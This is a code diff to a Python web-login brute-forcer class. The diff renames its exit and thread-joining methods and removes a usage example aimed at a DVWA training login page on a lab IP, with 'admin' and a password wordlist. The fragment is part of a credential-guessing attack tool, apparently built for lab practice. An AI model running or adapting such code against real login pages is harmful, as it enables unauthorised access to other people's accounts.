@@ -42,7 +42,7 @@ class BruteForce:
         words = read(self.passwords_list)
         for word in words:
             if self.creds_found:
-                self._exit()
+                self.exit()
             word = clean_word(word)
             data = {
                 self.username_field: self.username,
@@ -55,29 +55,23 @@ class BruteForce:
                 continue
             thread.start()
             number += 1
-        self._exit()
+        self.exit()
 
-    def _thread_collection(self):
+    def collection_of_threads(self):
         for thread in self.threads:
             try:
                 thread.join()
             except RuntimeError:
                 pass
 
-    def _exit(self):
+    def exit(self):
         if not self.creds_found:
             print("\n[*] - Approaching final keyspace...")
 
-        self._thread_collection()
+        self.collection_of_threads()
 
         if not self.creds_found:
             print(f"[-] - Failed to find valid credentials for {self.url}")
             self.end = time.time()
             print(f"[*] Total time - {self.end - self.start} seconds.")
         sys.exit()
-
-
-if __name__ == '__main__':
-    # python start.py -l admin -p passwords.txt -u http://192.168.56.101/dvwa/login.php -v "Login failed"
-    BruteForce("http://192.168.56.101/dvwa/login.php", 'admin', '../../../wordlist/passwords.txt', 'username',
-               'password', 'Login', 'Login failed').brute_force()
